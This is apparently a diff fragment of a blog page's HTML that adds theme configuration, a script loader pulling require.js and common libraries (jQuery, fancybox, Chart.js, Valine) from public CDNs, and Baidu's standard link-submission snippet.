+                  window.HUHU_CONFIG = JSON.parse("{\"share\":[\"weibo\",\"weixin\",\"qqkongjian\",\"QQ\",\"douban\",\"facebook\",\"twitter\",\"google\"],\"service_worker\":{\"open\":false}}")
+                </script> <script type="text/javascript">window.addEventListener('load', function() {
+    
+    window.loadJs = function(d, m, a) {
+      var c = document.getElementsByTagName('head')[0] || document.head || document.documentElement
+      var b = document.createElement('script')
+      b.defer = true
+      b.setAttribute('type', 'text/javascript')
+      b.setAttribute('charset', 'UTF-8')
+      b.setAttribute('async', 'true')
+      b.setAttribute('src', d)
+      m && b.setAttribute('data-main', '/scripts/app-built')
+      if (typeof a === 'function') {
+        if (window.attachEvent) {
+          b.onreadystatechange = function() {
+            var e = b.readyState
+            if (e === 'loaded' || e === 'complete') {
+              b.onreadystatechange = null
+              a()
+            }
+          }
+        } else {
+          b.onload = a
+        }
+      }
+      c.appendChild(b)
+    }
+    window.loadJs && window.loadJs('https://cdn.bootcss.com/require.js/2.3.6/require.min.js', true, function() {require.config({"paths":{"util":"util","share":"share","search":"search","pagemap":"pagemap.min","registerSW":"registerSW","valine":"cdn/Valine.min","av":["https://cdn.jsdelivr.net/npm/leancloud-storage/dist/av-min"],"pjax":["https://cdn.bootcss.com/jquery.pjax/2.0.1/jquery.pjax.min"],"jquery":["https://cdn.bootcss.com/jquery/3.4.1/jquery.min"],"confirm":["https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min"],"fancybox":["https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min"],"chart":["https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.bundle.min"]},"map":{"*":{"css":"https://cdn.bootcss.com/require-css/0.1.10/css.min.js"}},"shim":{"fancybox":{"deps":["css!https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.css"]},"confirm":{"deps":["css!https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min.css"]},"chart":{"deps":["css!https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.min.css"]}},"waitSeconds":3})})
+  })</script> <script type="text/javascript">
+                  ;(function() {
+                    var bp = document.createElement('script')
+                    var curProtocol = window.location.protocol.split(':')[0]
+                    if (curProtocol === 'https') {
+                      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js'
+                    } else {
+                      bp.src = 'http://push.zhanzhang.baidu.com/push.js'
+                    }
+                    var s = document.getElementsByTagName('script')[0]
+                    s.parentNode.insertBefore(bp, s)
+                  })()
+                </script> 
